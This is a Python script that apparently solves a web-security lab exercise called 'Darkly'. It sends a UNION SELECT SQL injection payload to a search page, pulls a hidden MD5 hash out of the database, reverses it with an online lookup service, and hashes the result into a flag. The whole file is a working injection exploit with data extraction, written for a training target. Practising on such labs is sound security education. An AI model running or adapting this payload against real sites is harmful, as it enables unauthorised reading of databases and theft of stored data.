import requests
import os
from lxml import html
from hashlib import sha256

ip = os.getenv('darkly_ip')
list_images_info = '1 union select null, concat(url, 0x0a, title, 0x0a, comment) from list_images'

def inject(query):
    r = requests.get(f'http://{ip}/index.php', params={
        'page': 'searchimg',
        'id': query,
        'Submit': 'Submit'
    })
    tree = html.fromstring(r.content)
    return tree.xpath('//pre[6]/text()')[1][-32:]

def reverse_md5(flag):
    r = requests.get('https://md5.gromweb.com/', params={'md5': flag})
    tree = html.fromstring(r.content)
    return tree.xpath('//em[@class="long-content string"]/text()')[0].lower()

if __name__ == '__main__':
    flag = inject(list_images_info)
    print('MD5 hash found in database:', flag)
    flag = reverse_md5(flag)
    print('Reversed and lowered:', flag)
    print('Final flag (sha256):', sha256(flag.encode()).hexdigest())

